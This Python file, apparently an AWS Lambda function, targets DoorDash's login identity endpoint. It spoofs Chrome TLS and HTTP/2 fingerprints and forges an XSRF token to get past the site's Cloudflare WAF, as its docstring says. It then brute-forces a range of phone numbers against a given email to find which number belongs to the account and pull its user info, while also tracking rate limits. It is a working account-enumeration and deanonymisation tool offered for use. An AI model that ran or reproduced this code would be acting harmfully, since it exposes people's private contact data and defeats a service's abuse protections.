import asyncio
import json
import random
import tls_client
import uuid

# The most common Chrome/Chromium-based user agents, to help prevent against UA-specific flagging
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 '
    'Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
]

H2_SETTINGS = {
    'HEADER_TABLE_SIZE': 65536,
    'MAX_CONCURRENT_STREAMS': 1000,
    'INITIAL_WINDOW_SIZE': 6291456,
    'MAX_HEADER_LIST_SIZE': 262144
}

H2_SETTINGS_ORDER = [
    'HEADER_TABLE_SIZE',
    'MAX_CONCURRENT_STREAMS',
    'INITIAL_WINDOW_SIZE',
    'MAX_HEADER_LIST_SIZE'
]

SUPPORTED_SIGNATURE_ALGORITHMS = [
    'ECDSAWithP256AndSHA256',
    'PSSWithSHA256',
    'PKCS1WithSHA256',
    'ECDSAWithP384AndSHA384',
    'PSSWithSHA384',
    'PKCS1WithSHA384',
    'PSSWithSHA512',
    'PKCS1WithSHA512'
]

SESSION_HEADERS = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,''image/apng,*/*;q=0.8,'
              'application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1'
}


def get_tls_client() -> tls_client.Session:
    """
    The ideal TLS client configuration to bypass DoorDash's
    Cloudflare WAF settings to prevent against web scraping.

    This will also prevent against fingerprint-based flagging,
    or TLS fingerprint-based flagging.
    :return: TLS client session
    """

    session = tls_client.Session()

    user_agent = random.choice(USER_AGENTS)
    version = user_agent.split('Chrome/')[1].split('.')[0]

    session.client_identifier = f'chrome_{version}'
    session.random_tls_extension_order = True

    session.h2_settings = H2_SETTINGS
    session.h2_settings_order = H2_SETTINGS

    session.supported_signature_algorithms = SUPPORTED_SIGNATURE_ALGORITHMS

    session.supported_versions = ['GREASE', '1.3', '1.2']
    session.key_share_curves = ['GREASE', 'X25519']
    session.cert_compression_algo = 'brotli'
    session.pseudo_header_order = [':method', ':authority', ':scheme', ':path']
    session.connection_flow = 15663105
    session.header_order = ['accept', 'user-agent', 'accept-encoding', 'accept-language']

    for header in SESSION_HEADERS:
        session.headers[header] = SESSION_HEADERS[header]

    session.headers['user-agent'] = user_agent
    session.headers['sec-ch-ua'] = f'"Google Chrome";v="{version}", "Not(A:Brand";v="8", "Chromium";v="{version}"'
    session.headers['content-type'] = 'application/json'

    xsrf_token = str(uuid.uuid4())

    session.headers['x-xsrf-token'] = xsrf_token
    session.cookies.set('XSRF-TOKEN', xsrf_token)

    return session


def pad_number(number: str, required_length: int) -> str:
    padded = ''

    for i in range(required_length - len(number)):
        padded += '0'

    return padded + number


def get_region(region_identifier: str) -> list[int]:
    return list(map(lambda x: int(x), region_identifier.split('-')))


async def test_email_phone_combo(session: tls_client, data_schema: dict[str, str | None], phone_number: str) -> dict[str, str | bool] | None:
    await asyncio.sleep(random.randint(0, 10) / 10.0)

    data_schema['phoneNumber'] = f'+1{phone_number}'

    response = session.post('https://identity.doordash.com/v2/auth/guided/email', data=json.dumps(data_schema))

    if response.status_code == 400:
        return None

    if response.status_code == 429 or 'userInfo' not in response.text:
        print(response.text)

        return {'ratelimited': True, 'phoneNumber': phone_number}

    return response.json()['userInfo']


def lambda_handler(event, context):
    session = get_tls_client()

    query = event['queryStringParameters']

    region = get_region(query['region'])

    email = query['email']
    beginning = query['beginning']
    ending = query['ending']

    padding_length = 10 - (len(beginning) + len(ending))

    tasks = []

    data_schema = {
        'clientId': '1666519390426295040',
        'client_id': '1666519390426295040',  # legacy client ID field?
        'deviceId': None,  # always null, does not depend on device ID cookie
        'email': email,
        'layout': 'identity_web_iframe',
        'redirectUri': '"https://www.doordash.com/post-login/"',
        'responseType': 'code',
        'scope': '"*"',
        'state': '/||ddca0fbd-b05b-4069-bfe0-d490d73042c1',
        'username': email
    }

    event_loop = asyncio.new_event_loop()

    for i in range(region[1] - region[0]):
        middle = str(region[1] - i - 1)
        padded = pad_number(middle, padding_length)

        phone_number = beginning + padded + ending

        tasks.append(event_loop.create_task(test_email_phone_combo(session, data_schema.copy(), phone_number)))

    result = list(filter(lambda x: x is not None, event_loop.run_until_complete(asyncio.gather(*tasks))))

    return {
        'statusCode': 200,
        'body': json.dumps(result),
    }

